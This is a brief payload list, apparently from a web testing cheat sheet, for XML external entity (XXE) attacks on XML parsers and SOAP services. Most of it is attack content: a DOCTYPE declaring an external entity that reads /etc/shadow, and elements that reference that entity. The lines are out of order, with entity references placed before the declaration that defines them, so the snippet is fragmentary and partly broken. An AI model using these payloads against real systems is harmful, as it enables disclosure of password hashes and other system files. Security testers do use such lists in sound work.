# Use these payloads to test XXE vulnerabilities
# Target: XML parsing endpoints, SOAP services, any XML input

# Basic XXE - File Disclosure (Linux)

<data>&xxe;</data>

<data>&xxe;</data>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
